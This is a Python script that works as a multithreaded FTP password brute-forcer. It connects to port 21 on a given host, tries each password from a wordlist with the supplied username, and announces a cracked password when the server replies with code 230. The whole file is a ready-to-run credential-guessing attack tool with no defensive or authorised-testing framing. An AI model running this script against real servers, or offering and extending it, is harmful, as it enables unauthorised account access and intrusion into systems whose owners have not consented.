import sys
import os
import re
import time
import socket
import threading  # Import threading module

if len(sys.argv) != 6:
    print("Usage: python main.py host + username + wordlist + timeout + max_threads")
    sys.exit(1)

server = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]
timeout = float(sys.argv[4])
max_threads = int(sys.argv[5])
semaphore = threading.Semaphore(max_threads)

def attempt_login(server, username, key, timeout, start):
    with semaphore:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((server, 21))
            s.recv(1024)
            s.send(("USER " + username + "\r\n").encode('utf-8'))
            s.recv(1024)
            s.send(("PASS " + key.strip() + "\r\n").encode('utf-8'))
            result = s.recv(1024)
            s.send("QUIT\r\n".encode('utf-8'))
            if re.search("230", result.decode('utf-8')):
                print("<==================================>")
                print("\033[32mBrute force done!\033[0m")
                print("<==================================>")
                print(f"Password found: {key.strip()}")
                print(f"Username: {username}")
                print(f"Server: {server}")
                print("<==================================>")
                print("Ftp cracked in " + str(time.time() - start) + " seconds")
                print("\033[32mExiting...\033[0m")
                os._exit(0)  # Exit all threads immediately
            else:
                print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31m Failed\033[0m to login with user: {username} and password: {key.strip()}")
        except socket.timeout:
            print(f"{time.strftime('%d/%m/%y %H:%M:%S')} \033[31mTimeout\033[0m to login with user: {username} and password: {key.strip()}")
        finally:
            s.close()

try:
    with open(f"{wordlist}.txt") as file:
        start = time.time()  # Track the start time

        threads = []
        keys = file.readlines()
        for key in keys:
            t = threading.Thread(target=attempt_login, args=(server, username, key, timeout, start))
            t.start()
            threads.append(t)
            # Calculate delay based on the current number of active threads
            active_threads = threading.active_count()
            delay = timeout / active_threads if active_threads > 0 else timeout
            time.sleep(delay)  # Use calculated delay between thread starts

        for t in threads:
            t.join()

except FileNotFoundError:
    print(f"Wordlist file '{wordlist}.txt' not found.")
    sys.exit(1)
except Exception as e:
    print(f"An error occurred: {e}")
    sys.exit(1)